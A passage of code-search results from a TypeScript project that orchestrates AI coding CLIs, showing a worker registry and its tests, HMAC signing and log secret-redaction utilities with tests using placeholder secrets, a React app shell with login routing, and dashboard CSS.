WORKER_CONFIGS['ollama-launch'];\n      expect(ollamaLaunch.type).toBe('ollama-launch');\n      expect(ollamaLaunch.command).toBe('ollama');\n      expect(ollamaLaunch.displayName).toBe('Ollama Launch (Claude)');\n      expect(ollamaLaunch.defaultModel).toBe('claude');\n      expect(ollamaLaunch.supportsModelSelection).toBe(true);\n      expect(ollamaLaunch.description).toContain('Claude models');\n      expect(ollamaLaunch.subcommand).toBe('launch');\n    });\n\n    it('should have correct worker type for Codex', () => {\n      const codex = WORKER_CONFIGS.codex;\n      expect(codex.type).toBe('codex');\n      expect(codex.command).toBe('codex-cli');\n      expect(codex.displayName).toBe('Codex CLI');\n      expect(codex.supportsModelSelection).toBe(false);\n      expect(codex.description).toContain('OpenAI');\n    });\n\n    it('should have correct worker type for Gemini', () => {\n      const gemini = WORKER_CONFIGS.gemini;\n      expect(gemini.type).toBe('gemini');\n      expect(gemini.command).toBe('gemini-cli');\n      expect(gemini.displayName).toBe('Gemini CLI');\n      expect(gemini.defaultModel).toBe('gemini-pro');\n      expect(gemini.supportsModelSelection).toBe(true);\n      expect(gemini.description).toContain('Google');\n    });\n\n    it('should have correct worker type for Rev', () => {\n      const rev = WORKER_CONFIGS.rev;\n      expect(rev.type).toBe('rev');\n      expect(rev.command).toBe('rev');\n      expect(rev.displayName).toBe('Rev');\n      expect(rev.supportsModelSelection).toBe(false);\n      expect(rev.description).toContain('Custom');\n    });\n  });\n\n  describe('Helper Functions', () => {\n    it('getWorkerConfig should return correct config', () => {\n      const claude = getWorkerConfig('claude');\n      expect(claude?.type).toBe('claude');\n\n      const ollama = getWorkerConfig('ollama-launch');\n      expect(ollama?.type).toBe('ollama-launch');\n\n      const invalid = getWorkerConfig('invalid' as any);\n      expect(invalid).toBeUndefined();\n    });\n\n    it('getWorkerCommand should return command for worker type', () => {\n      expect(getWorkerCommand('claude')).toBe('claude');\n      expect(getWorkerCommand('ollama-launch')).toBe('ollama');\n      expect(getWorkerCommand('codex')).toBe('codex-cli');\n      expect(getWorkerCommand('gemini')).toBe('gemini-cli');\n      expect(getWorkerCommand('rev')).toBe('rev');\n      // Fallback for unknown worker\n      expect(getWorkerCommand('unknown')).toBe('unknown');\n    });\n\n    it('getDefaultModel should return default model for worker type', () => {\n      expect(getDefaultModel('claude')).toBeUndefined();\n      expect(getDefaultModel('ollama-launch')).toBe('claude');\n      expect(getDefaultModel('codex')).toBeUndefined();\n      expect(getDefaultModel('gemini')).toBe('gemini-pro');\n      expect(getDefaultModel('rev')).toBeUndefined();\n      expect(getDefaultModel('unknown')).toBeUndefined();\n    });\n\n    it('isValidWorkerType should validate worker types', () => {\n      expect(isValidWorkerType('claude')).toBe(true);\n      expect(isValidWorkerType('ollama-launch')).toBe(true);\n      expect(isValidWorkerType('codex')).toBe(true);\n      expect(isValidWorkerType('gemini')).toBe(true);\n      expect(isValidWorkerType('rev')).toBe(true);\n      expect(isValidWorkerType('invalid')).toBe(false);\n      expect(isValidWorkerType('')).toBe(false);\n    });\n\n    it('getAllWorkerTypes should return all worker types', () => {\n      const types = getAllWorkerTypes();\n      expect(types).toContain('claude');\n      expect(types).toContain('ollama-launch');\n      expect(types).toContain('codex');\n      expect(types).toContain('gemini');\n      expect(types).toContain('rev');\n    });\n\n    it('getWorkerDisplayName should return formatted name', () => {\n      expect(getWorkerDisplayName('claude')).toBe('Claude');\n      expect(getWorkerDisplayName('ollama-launch')).toBe('Ollama Launch (Claude)');\n      expect(getWorkerDisplayName('codex')).toBe('Codex CLI');\n      expect(getWorkerDisplayName('gemini')).toBe('Gemini CLI');\n      expect(getWorkerDisplayName('rev')).toBe('Rev');\n    });\n\n    it('getWorkerIcon should return emoji for worker type', () => {\n      expect(getWorkerIcon('claude')).toBe('');\n      expect(getWorkerIcon('ollama-launch')).toBe('');\n      expect(getWorkerIcon('codex')).toBe('');\n      expect(getWorkerIcon('gemini')).toBe('');\n      expect(getWorkerIcon('rev')).toBe('');\n    });\n  });\n\n  describe('Model Lists', () => {\n    it('GEMINI_MODELS should have common models', () => {\n      expect(GEMINI_MODELS.length).toBeGreaterThan(0);\n      expect(GEMINI_MODELS).toContainEqual({ value: 'gemini-pro', label: 'Gemini Pro' });\n      expect(GEMINI_MODELS).toContainEqual({ value: 'gemini-1.5-pro', label: 'Gemini 1.5 Pro' });\n      expect(GEMINI_MODELS).toContainEqual({ value: 'gemini-1.5-flash', label: 'Gemini 1.5 Flash' });\n      expect(GEMINI_MODELS).toContainEqual({ value: 'custom', label: 'Custom...' });\n    });\n  });\n\n  describe('Worker Subcommands', () => {\n    it('Ollama Launch should have launch subcommand', () => {\n      const ollamaLaunch = WORKER_CONFIGS['ollama-launch'];\n      expect(ollamaLaunch.subcommand).toBe('launch');\n    });\n\n    it('Claude should not have subcommand', () => {\n      const claude = WORKER_CONFIGS.claude;\n      expect(claude.subcommand).toBeUndefined();\n    });\n  });\n});\n\ndescribe('Worker Type Validation', () => {\n  it('should reject invalid worker types', () => {\n    const invalidTypes = ['invalid', '', 'CLAUDE', 'OLLAMA', 'Claude', 'undefined', null];\n    for (const type of invalidTypes) {\n      expect(isValidWorkerType(type as any)).toBe(false);\n    }\n  });\n\n  it('should accept all valid worker types', () => {\n    const validTypes: WorkerType[] = ['claude', 'ollama-launch', 'codex', 'gemini', 'rev'];\n    for (const type of validTypes) {\n      expect(isValidWorkerType(type)).toBe(true);\n    }\n  });\n});\n\ndescribe('Worker Display Names', () => {\n  it('should capitalize first letter for simple names', () => {\n    expect(getWorkerDisplayName('claude')).toBe('Claude');\n    expect(getWorkerDisplayName('codex')).toBe('Codex CLI');\n    expect(getWorkerDisplayName('rev')).toBe('Rev');", "metadata": {"file": "wrapper/src/services/worker-registry.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/worker-registry.test.ts", "location": "wrapper/src/services/worker-registry.test.ts:201", "score": 0.0, "content": "  });\n\n  it('should capitalize both parts for hyphenated names', () => {\n    // The actual implementation returns the full display name from config\n    expect(getWorkerDisplayName('ollama-launch')).toBe('Ollama Launch (Claude)');\n  });\n\n  it('should handle multi-part hyphenated names', () => {\n    // This tests future extensibility\n    const displayName = 'multi-part-name'.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');\n    expect(displayName).toBe('Multi Part Name');\n  });\n});", "metadata": {"file": "wrapper/src/services/worker-registry.test.ts", "start_line": 201, "end_line": 213, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/worker-registry.ts", "location": "wrapper/src/services/worker-registry.ts:1", "score": 0.0, "content": "import { config } from '../config.js';\n\n/**\n * Supported worker types\n */\nexport type WorkerType = 'claude' | 'ollama-launch' | 'codex' | 'gemini' | 'rev';\n\n/**\n * Worker configuration\n */\nexport interface WorkerConfig {\n  type: WorkerType;\n  command: string;\n  displayName: string;\n  icon: string;\n  defaultModel?: string;\n  supportsModelSelection: boolean;\n  description: string;\n  subcommand?: string; // For workers that use a subcommand (e.g., \"launch\", \"run\")\n}\n\n/**\n * Registry of all worker configurations\n */\nexport const WORKER_CONFIGS: Record<WorkerType, WorkerConfig> = {\n  claude: {\n    type: 'claude',\n    command: config.claudeCommand,\n    displayName: 'Claude',\n    icon: '',\n    defaultModel: undefined,\n    supportsModelSelection: false,\n    description: 'Anthropic Claude Code - Interactive AI coding assistant'\n  },\n  'ollama-launch': {\n    type: 'ollama-launch',\n    command: config.ollamaCommand,\n    displayName: 'Ollama Launch (Claude)',\n    icon: '',\n    defaultModel: 'claude',\n    supportsModelSelection: true,\n    description: 'Ollama launch mode for Claude models with enhanced capabilities',\n    subcommand: 'launch'\n  },\n  codex: {\n    type: 'codex',\n    command: config.codexCommand,\n    displayName: 'Codex CLI',\n    icon: '',\n    defaultModel: undefined,\n    supportsModelSelection: false,\n    description: 'OpenAI Codex CLI for code generation'\n  },\n  gemini: {\n    type: 'gemini',\n    command: config.geminiCommand,\n    displayName: 'Gemini CLI',\n    icon: '',\n    defaultModel: config.geminiModel,\n    supportsModelSelection: true,\n    description: 'Google Gemini CLI for AI assistance'\n  },\n  rev: {\n    type: 'rev',\n    command: config.revCommand,\n    displayName: 'Rev',\n    icon: '',\n    defaultModel: undefined,\n    supportsModelSelection: false,\n    description: 'Custom AI coding tool'\n  }\n};\n\n/**\n * Ollama Launch integrations for user selection\n * Note: ollama launch only works with these specific integrations, not arbitrary models\n */\nexport const OLLAMA_LAUNCH_INTEGRATIONS: Array<{ value: string; label: string }> = [\n  { value: 'claude', label: 'Claude Code' },\n  { value: 'opencode', label: 'OpenCode' },\n  { value: 'codex', label: 'Codex' },\n  { value: 'droid', label: 'Droid' }\n];\n\n/**\n * Common Gemini models for user selection\n */\nexport const GEMINI_MODELS: Array<{ value: string; label: string }> = [\n  { value: 'gemini-pro', label: 'Gemini Pro' },\n  { value: 'gemini-pro-vision', label: 'Gemini Pro Vision' },\n  { value: 'gemini-1.5-pro', label: 'Gemini 1.5 Pro' },\n  { value: 'gemini-1.5-flash', label: 'Gemini 1.5 Flash' },\n  { value: 'custom', label: 'Custom...' }\n];\n\n/**\n * Get worker configuration by type\n */\nexport function getWorkerConfig(workerType: WorkerType): WorkerConfig | undefined {\n  return WORKER_CONFIGS[workerType];\n}\n\n/**\n * Get CLI command for a worker type\n */\nexport function getWorkerCommand(workerType: string | WorkerType): string {\n  const workerConfig = WORKER_CONFIGS[workerType as WorkerType];\n  return workerConfig?.command || workerType;\n}\n\n/**\n * Get default model for a worker type (if supported)\n */\nexport function getDefaultModel(workerType: string | WorkerType): string | undefined {\n  const config = WORKER_CONFIGS[workerType as WorkerType];\n  return config?.defaultModel;\n}\n\n/**\n * Check if worker type is valid\n */\nexport function isValidWorkerType(type: string): type is WorkerType {\n  return type in WORKER_CONFIGS;\n}\n\n\n/**\n * Get all worker types\n */\nexport function getAllWorkerTypes(): WorkerType[] {\n  return Object.keys(WORKER_CONFIGS) as WorkerType[];\n}\n\n/**\n * Get worker display name\n */\nexport function getWorkerDisplayName(workerType: WorkerType): string {\n  return WORKER_CONFIGS[workerType]?.displayName || workerType;\n}\n\n/**\n * Get worker icon (emoji)\n */\nexport function getWorkerIcon(workerType: string): string | undefined {\n  const icons: Record<string, string> = {\n    claude: '',\n    'ollama-launch': '',\n    codex: '',\n    gemini: '',\n    rev: ''\n  };\n  return icons[workerType];\n}", "metadata": {"file": "wrapper/src/services/worker-registry.ts", "start_line": 1, "end_line": 153, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/utils/crypto.test.ts", "location": "wrapper/src/utils/crypto.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, beforeAll } from 'vitest';\nimport {\n  createSignature,\n  hashBody,\n  generateNonce,\n  redactSecrets\n} from './crypto.js';\nimport { config } from '../config.js';\n\n// Set a test secret\nbeforeAll(() => {\n  config.hmacSecret = 'test-secret-key-that-is-long-enough-for-testing';\n});\n\ndescribe('Wrapper Crypto', () => {\n  describe('Signature Creation', () => {\n    it('should create valid HMAC signature', () => {\n      const sig = createSignature({\n        method: 'POST',\n        path: '/api/ingest/event',\n        bodyHash: hashBody('test'),\n        timestamp: 1234567890,\n        nonce: 'test-nonce'\n      });\n\n      expect(sig).toMatch(/^[a-f0-9]{64}$/);\n    });\n\n    it('should include runId and capabilityToken in signature', () => {\n      const sig1 = createSignature({\n        method: 'POST',\n        path: '/api/test',\n        bodyHash: hashBody(''),\n        timestamp: 1234567890,\n        nonce: 'nonce',\n        runId: 'run1',\n        capabilityToken: 'token1'\n      });\n\n      const sig2 = createSignature({\n        method: 'POST',\n        path: '/api/test',\n        bodyHash: hashBody(''),\n        timestamp: 1234567890,\n        nonce: 'nonce',\n        runId: 'run2',\n        capabilityToken: 'token1'\n      });\n\n      expect(sig1).not.toBe(sig2);\n    });\n  });\n\n  describe('Nonce Generation', () => {\n    it('should generate cryptographically random nonces', () => {\n      const nonces = [];\n      for (let i = 0; i < 100; i++) {\n        nonces.push(generateNonce());\n      }\n\n      // All unique\n      expect(new Set(nonces).size).toBe(100);\n\n      // Proper format\n      for (const nonce of nonces) {\n        expect(nonce).toMatch(/^[a-f0-9]{32}$/);\n      }\n    });\n  });\n\n  describe('Body Hashing', () => {\n    it('should produce SHA-256 hashes', () => {\n      const hash = hashBody('test content');\n      expect(hash).toMatch(/^[a-f0-9]{64}$/);\n    });\n\n    it('should hash empty string', () => {\n      const hash = hashBody('');\n      expect(hash).toBe('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');\n    });\n  });\n\n  describe('Secret Redaction', () => {\n    it('should redact common secret patterns', () => {\n      const secrets = [\n        'export API_KEY=mysecretkey123',\n        'password: supersecret',\n        'token=\"auth_token_here\"',\n        'sk-1234567890abcdefghij',\n        'ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',\n        'npm_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\n      ];\n\n      for (const secret of secrets) {\n        expect(redactSecrets(secret)).toContain('[REDACTED]');\n        expect(redactSecrets(secret)).not.toContain('secret');\n        expect(redactSecrets(secret)).not.toContain('XXXX');\n      }\n    });\n\n    it('should not redact normal log output', () => {\n      const logs = [\n        'Running tests...',\n        'Test passed: 42/42',\n        'Build completed successfully',\n        'Error: file not found'\n      ];\n\n      for (const log of logs) {\n        expect(redactSecrets(log)).toBe(log);\n      }\n    });\n\n    it('should handle multiline content', () => {\n      const content = `\nStarting server...\nLoaded config:\n  port: 3000\n  api_key=secret123\n  debug: true\nServer started.\n`;\n\n      const redacted = redactSecrets(content);\n      expect(redacted).toContain('Starting server');\n      expect(redacted).toContain('Server started');\n      expect(redacted).toContain('[REDACTED]');\n      expect(redacted).not.toContain('secret123');\n    });\n  });\n});", "metadata": {"file": "wrapper/src/utils/crypto.test.ts", "start_line": 1, "end_line": 131, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/utils/crypto.ts", "location": "wrapper/src/utils/crypto.ts:1", "score": 0.0, "content": "import { createHmac, createHash, randomBytes } from 'crypto';\nimport { config } from '../config.js';\n\nexport interface SignatureComponents {\n  method: string;\n  path: string;\n  bodyHash: string;\n  timestamp: number;\n  nonce: string;\n  runId?: string;\n  capabilityToken?: string;\n}\n\n/**\n * Create HMAC signature for gateway authentication\n */\nexport function createSignature(components: SignatureComponents): string {\n  const message = [\n    components.method.toUpperCase(),\n    components.path,\n    components.bodyHash,\n    components.timestamp.toString(),\n    components.nonce,\n    components.runId || '',\n    components.capabilityToken || ''\n  ].join('\\n');\n\n  return createHmac('sha256', config.hmacSecret).update(message).digest('hex');\n}\n\n/**\n * Hash body content\n */\nexport function hashBody(body: string | Buffer): string {\n  return createHash('sha256').update(body).digest('hex');\n}\n\n/**\n * Generate random nonce\n */\nexport function generateNonce(): string {\n  return randomBytes(16).toString('hex');\n}\n\n/**\n * Redact secrets from text\n */\nexport function redactSecrets(text: string): string {\n  let result = text;\n  for (const pattern of config.secretPatterns) {\n    result = result.replace(pattern, '[REDACTED]');\n  }\n  return result;\n}", "metadata": {"file": "wrapper/src/utils/crypto.ts", "start_line": 1, "end_line": 54, "language": "ts"}}, {"corpus": "code", "source": "ui/src/App.tsx", "location": "ui/src/App.tsx:1", "score": 0.0, "content": "import { Routes, Route, Navigate } from 'react-router-dom';\nimport { useState, useEffect } from 'react';\nimport { ToastProvider } from './components/ui';\nimport { Layout } from './components/Layout';\nimport {\n  Dashboard,\n  Runs,\n  RunDetail,\n  Clients,\n  ClientDetailPage,\n  Alerts,\n  Settings,\n} from './pages';\nimport Login from './components/Login';\nimport Setup from './components/Setup';\n\ninterface User {\n  id: string;\n  username: string;\n  role: string;\n}\n\ninterface AuthStatus {\n  setupRequired: boolean;\n  cloudflareEnabled: boolean;\n  localAuthEnabled: boolean;\n}\n\nfunction App() {\n  const [user, setUser] = useState<User | null>(null);\n  const [authStatus, setAuthStatus] = useState<AuthStatus | null>(null);\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    checkAuth();\n  }, []);\n\n  async function checkAuth() {\n    try {\n      // First check auth status\n      const statusRes = await fetch('/api/auth/status');\n      const status = await statusRes.json();\n      setAuthStatus(status);\n\n      // Try to get current user\n      const meRes = await fetch('/api/auth/me');\n      if (meRes.ok) {\n        const data = await meRes.json();\n        setUser(data.user);\n      }\n    } catch (err) {\n      console.error('Auth check failed:', err);\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  async function handleLogout() {\n    await fetch('/api/auth/logout', { method: 'POST' });\n    setUser(null);\n  }\n\n  if (loading) {\n    return (\n      <div className=\"app\">\n        <div className=\"loading\">\n          <div className=\"spinner\" />\n        </div>\n      </div>\n    );\n  }\n\n  // Setup required\n  if (authStatus?.setupRequired) {\n    return (\n      <ToastProvider>\n        <Setup onComplete={() => checkAuth()} />\n      </ToastProvider>\n    );\n  }\n\n  // Not authenticated\n  if (!user && !authStatus?.cloudflareEnabled) {\n    return (\n      <ToastProvider>\n        <Login onLogin={(u) => setUser(u)} />\n      </ToastProvider>\n    );\n  }\n\n  return (\n    <ToastProvider>\n      <div className=\"app\">\n        <Layout user={user} onLogout={handleLogout}>\n          <Routes>\n            {/* Dashboard */}\n            <Route path=\"/\" element={<Dashboard user={user} />} />\n\n            {/* Runs */}\n            <Route path=\"/runs\" element={<Runs user={user} />} />\n            <Route path=\"/runs/:runId\" element={<RunDetail user={user} />} />\n\n            {/* Clients */}\n            <Route path=\"/clients\" element={<Clients user={user} />} />\n            <Route path=\"/clients/:clientId\" element={<ClientDetailPage user={user} />} />\n\n            {/* Alerts */}\n            <Route path=\"/alerts\" element={<Alerts user={user} />} />\n\n            {/* Settings */}\n            <Route path=\"/settings\" element={<Settings user={user} onLogout={handleLogout} />} />\n\n            {/* Fallback */}\n            <Route path=\"*\" element={<Navigate to=\"/\" replace />} />\n          </Routes>\n        </Layout>\n      </div>\n    </ToastProvider>\n  );\n}\n\nexport default App;", "metadata": {"file": "ui/src/App.tsx", "start_line": 1, "end_line": 122, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/main.tsx", "location": "ui/src/main.tsx:1", "score": 0.0, "content": "import React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport { BrowserRouter } from 'react-router-dom';\nimport App from './App';\nimport './styles.css';\n\nReactDOM.createRoot(document.getElementById('root')!).render(\n  <React.StrictMode>\n    <BrowserRouter>\n      <App />\n    </BrowserRouter>\n  </React.StrictMode>\n);", "metadata": {"file": "ui/src/main.tsx", "start_line": 1, "end_line": 13, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/styles.css", "location": "ui/src/styles.css:1", "score": 0.0, "content": ":root {\n  --bg-primary: #0d1117;\n  --bg-secondary: #161b22;\n  --bg-tertiary: #21262d;\n  --text-primary: #e6edf3;\n  --text-secondary: #8b949e;\n  --text-muted: #6e7681;\n  --border-color: #30363d;\n  --accent-blue: #58a6ff;\n  --accent-green: #3fb950;\n  --accent-red: #f85149;\n  --accent-yellow: #d29922;\n  --accent-purple: #a371f7;\n\n  /* Touch targets for mobile */\n  --touch-target: 44px;\n\n  /* Safe area insets for mobile */\n  --safe-area-inset-bottom: env(safe-area-inset-bottom, 0px);\n}\n\n* {\n  box-sizing: border-box;\n  margin: 0;\n  padding: 0;\n}\n\nhtml, body {\n  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;\n  background: var(--bg-primary);\n  color: var(--text-primary);\n  line-height: 1.5;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  font-size: 14px;\n}\n\nbody {\n  min-height: 100vh;\n  min-height: 100dvh;\n}\n\n#root {\n  min-height: 100vh;\n  min-height: 100dvh;\n  display: flex;\n  flex-direction: column;\n}\n\n/* Layout */\n.app {\n  display: flex;\n  flex-direction: column;\n  min-height: 100vh;\n  min-height: 100dvh;\n}\n\n.layout {\n  display: flex;\n  flex-direction: column;\n  min-height: 100vh;\n  min-height: 100dvh;\n}\n\n/* Header - Desktop */\n.header {\n  background: var(--bg-secondary);\n  border-bottom: 1px solid var(--border-color);\n  padding: 12px 16px;\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  position: sticky;\n  top: 0;\n  z-index: 100;\n}\n\n.header-desktop {\n  display: none;\n}\n\n.header-mobile {\n  display: flex;\n}\n\n@media (min-width: 768px) {\n  .header-desktop {\n    display: flex;\n    padding: 12px 24px;\n  }\n\n  .header-mobile {\n    display: none;\n  }\n}\n\n.header h1 {\n  font-size: 18px;\n  font-weight: 600;\n  display: flex;\n  align-items: center;\n  gap: 8px;\n}\n\n.header h1 a {\n  color: inherit;\n  text-decoration: none;\n}\n\n/* Desktop Navigation */\n.desktop-nav {\n  display: flex;\n  gap: 4px;\n}\n\n.nav-link {\n  display: flex;\n  align-items: center;\n  gap: 6px;\n  padding: 8px 12px;\n  font-size: 14px;\n  color: var(--text-secondary);\n  text-decoration: none;\n  border-radius: 6px;\n  transition: all 0.15s ease;\n}\n\n.nav-link:hover {\n  color: var(--text-primary);\n  background: var(--bg-tertiary);\n}\n\n.nav-link-active {\n  color: var(--accent-blue);\n  background: rgba(88, 166, 255, 0.1);\n}\n\n.nav-icon {\n  font-size: 16px;\n}\n\n.nav-badge {\n  padding: 2px 6px;\n  font-size: 10px;\n  background: var(--accent-red);\n  color: white;\n  border-radius: 10px;\n  margin-left: 4px;\n}\n\n/* Bottom Navigation - Mobile */\n.bottom-nav {\n  position: fixed;\n  bottom: 0;\n  left: 0;\n  right: 0;\n  background: var(--bg-secondary);\n  border-top: 1px solid var(--border-color);\n  display: flex;\n  justify-content: space-around;\n  padding: 8px 0;\n  padding-bottom: calc(8px + var(--safe-area-inset-bottom));\n  z-index: 100;\n}\n\n.bottom-nav-item {\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n  padding: 4px 12px;\n  color: var(--text-secondary);\n  text-decoration: none;\n  position: relative;\n  min-width: var(--touch-target);\n  min-height: var(--touch-target);\n}\n\n@media (min-width: 768px) {\n  .bottom-nav {\n    display: none;\n  }\n}\n\n/* Main content */\n.main {\n  flex: 1;\n  padding: 16px;\n  padding-bottom: calc(80px + var(--safe-area-inset-bottom)); /* Space for bottom nav */\n  max-width: 1200px;\n  margin: 0 auto;\n  width: 100%;\n}\n\n@media (min-width: 768px) {\n  .main {\n    padding: 24px;\n    padding-bottom: 24px;\n  }\n}", "metadata": {"file": "ui/src/styles.css", "start_line": 1, "end_line": 200, "language": "css"}}, {"corpus": "code", "source": "ui/src/styles.css", "location": "ui/src/styles.css:201", "score": 0.0, "content": "\n/* Page header */\n.page-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  margin-bottom: 16px;\n  flex-wrap: wrap;\n  gap: 12px;\n}\n\n.page-title {\n  font-size: 20px;\n  font-weight: 600;\n}\n\n/* Section titles */\n.section-title {\n  font-size: 16px;\n  font-weight: 600;\n  margin-bottom: 12px;\n  display: flex;\n  align-items: center;\n  gap: 8px;\n}\n\n.section-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  margin-bottom: 12px;\n}\n\n/* Cards */\n.card {\n  background: var(--bg-secondary);\n  border: 1px solid var(--border-color);\n  border-radius: 8px;\n  padding: 16px;\n  margin-bottom: 12px;\n}\n\n.card-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  margin-bottom: 12px;\n}\n\n.card-title {\n  font-size: 16px;\n  font-weight: 600;\n}\n\n/* Stats Grid */\n.stats-grid {\n  display: grid;\n  grid-template-columns: repeat(2, 1fr);\n  gap: 12px;\n  margin-bottom: 24px;\n}\n\n@media (min-width: 640px) {\n  .stats-grid {\n    grid-template-columns: repeat(4, 1fr);\n  }\n}\n\n.stat-card {\n  background: var(--bg-secondary);\n  border: 1px solid var(--border-color);\n  border-radius: 8px;\n  padding: 16px;\n  text-align: center;\n}\n\n.stat-value {\n  font-size: 28px;\n  font-weight: 700;\n  color: var(--text-primary);\n  line-height: 1.2;\n}\n\n.stat-label {\n  font-size: 12px;\n  color: var(--text-muted);\n  text-transform: uppercase;\n  letter-spacing: 0.5px;\n  margin-top: 4px;\n}\n\n/* Dashboard sections */\n.dashboard-section {\n  margin-bottom: 24px;\n}\n\n.attention-group {\n  margin-bottom: 16px;\n}\n\n.attention-title {\n  font-size: 14px;\n  font-weight: 500;\n  color: var(--text-secondary);\n  margin-bottom: 8px;\n  display: flex;\n  align-items: center;\n  gap: 8px;\n}\n\n.attention-badge {\n  padding: 2px 8px;\n  font-size: 11px;\n  border-radius: 10px;\n  color: white;\n}\n\n.attention-items {\n  display: flex;\n  flex-direction: column;\n  gap: 8px;\n}\n\n.attention-item {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  padding: 10px 12px;\n  background: var(--bg-secondary);\n  border: 1px solid var(--border-color);\n  border-radius: 6px;\n}\n\n/* Run and Client lists */\n.run-list,\n.client-list {\n  display: flex;\n  flex-direction: column;\n  gap: 8px;\n}\n\n/* Activity timeline */\n.activity-list {\n  display: flex;\n  flex-direction: column;\n  gap: 4px;\n}\n\n.activity-item {\n  display: flex;\n  align-items: center;\n  gap: 12px;\n  padding: 10px 12px;\n  background: var(--bg-secondary);\n  border-radius: 6px;\n  font-size: 13px;\n}\n\n.activity-item:hover {\n  background: var(--bg-tertiary);\n}\n\n/* Buttons */\n.btn {\n  display: inline-flex;\n  align-items: center;\n  justify-content: center;\n  gap: 6px;\n  padding: 8px 16px;\n  min-height: var(--touch-target);\n  font-size: 14px;\n  font-weight: 500;\n  border: 1px solid var(--border-color);\n  border-radius: 6px;\n  background: var(--bg-tertiary);\n  color: var(--text-primary);\n  cursor: pointer;\n  transition: all 0.15s ease;\n  text-decoration: none;\n  white-space: nowrap;\n}\n\n.btn:hover {\n  background: var(--border-color);\n}\n\n.btn:active {\n  transform: scale(0.98);\n}\n\n.btn:disabled {\n  opacity: 0.5;\n  cursor: not-allowed;\n}\n\n.btn-primary {\n  background: var(--accent-blue);\n  border-color: var(--accent-blue);\n  color: white;\n}", "metadata": {"file": "ui/src/styles.css", "start_line": 201, "end_line": 400, "language": "css"}}, {"corpus": "code", "source": "ui/src/styles.css", "location": "ui/src/styles.css:401", "score": 0.0, "content": "\n.btn-primary:hover {\n  background: #4896e8;\n}\n\n.btn-danger {\n  background: var(--accent-red);\n  border-color: var(--accent-red);\n  color: white;\n}\n\n.btn-danger:hover {\n  background: #e73a3a;\n}\n\n.btn-sm {\n  padding: 4px 12px;\n  min-height: 32px;\n  font-size: 12px;\n}\n\n.btn-group {\n  display: flex;\n  gap: 8px;\n  flex-wrap: wrap;\n}\n\n/* Tabs */\n.tabs {\n  display: flex;\n  gap: 4px;\n  border-bottom: 1px solid var(--border-color);\n  margin-bottom: 16px;\n  overflow-x: auto;\n  -webkit-overflow-scrolling: touch;\n}\n\n.tab {\n  display: flex;\n  align-items: center;\n  gap: 6px;\n  padding: 10px 16px;\n  font-size: 14px;\n  font-weight: 500;\n  color: var(--text-secondary);\n  background: none;\n  border: none;\n  border-bottom: 2px solid transparent;\n  cursor: pointer;\n  white-space: nowrap;\n  transition: all 0.15s ease;\n}\n\n.tab:hover {\n  color: var(--text-primary);\n}\n\n.tab-active {\n  color: var(--accent-blue);\n  border-bottom-color: var(--accent-blue);\n}\n\n.tab-badge {\n  padding: 2px 6px;\n  font-size: 10px;\n  background: var(--bg-tertiary);\n  border-radius: 10px;\n}\n\n.tab-content {\n  min-height: 200px;\n}\n\n/* Status badges (legacy) */\n.status {\n  display: inline-flex;\n  align-items: center;\n  gap: 6px;\n  padding: 4px 10px;\n  font-size: 12px;\n  font-weight: 500;\n  border-radius: 12px;\n  text-transform: uppercase;\n  letter-spacing: 0.5px;\n}\n\n.status-running {\n  background: rgba(59, 185, 80, 0.15);\n  color: var(--accent-green);\n}\n\n.status-pending {\n  background: rgba(210, 153, 34, 0.15);\n  color: var(--accent-yellow);\n}\n\n.status-done {\n  background: rgba(88, 166, 255, 0.15);\n  color: var(--accent-blue);\n}\n\n.status-failed {\n  background: rgba(248, 81, 73, 0.15);\n  color: var(--accent-red);\n}\n\n.status-dot {\n  width: 8px;\n  height: 8px;\n  border-radius: 50%;\n  background: currentColor;\n}\n\n.status-running .status-dot,\n.status-dot-pulse {\n  animation: pulse 1.5s ease-in-out infinite;\n}\n\n@keyframes pulse {\n  0%, 100% { opacity: 1; }\n  50% { opacity: 0.4; }\n}\n\n/* Log viewer */\n.log-container {\n  background: var(--bg-primary);\n  border: 1px solid var(--border-color);\n  border-radius: 8px;\n  overflow: hidden;\n}\n\n.log-header {\n  background: var(--bg-secondary);\n  padding: 12px 16px;\n  border-bottom: 1px solid var(--border-color);\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}\n\n.log-content {\n  font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;\n  font-size: 13px;\n  line-height: 1.6;\n  padding: 12px;\n  max-height: 60vh;\n  overflow-y: auto;\n  white-space: pre-wrap;\n  word-break: break-all;\n}\n\n.log-line {\n  padding: 2px 0;\n}\n\n.log-line-stdout {\n  color: var(--text-primary);\n}\n\n.log-line-stderr {\n  color: var(--accent-red);\n}\n\n.log-line-info {\n  color: var(--accent-blue);\n}\n\n.log-line-marker {\n  color: var(--accent-purple);\n  font-weight: 600;\n}\n\n.log-line-assist {\n  color: var(--accent-green);\n  font-weight: 600;\n}\n\n/* Forms */\n.form-group {\n  margin-bottom: 16px;\n}\n\n.form-label {\n  display: block;\n  font-size: 13px;\n  font-weight: 500;\n  margin-bottom: 6px;\n  color: var(--text-secondary);\n}\n\n.form-input {\n  width: 100%;\n  padding: 10px 12px;\n  min-height: var(--touch-target);\n  font-size: 14px;\n  background: var(--bg-primary);\n  border: 1px 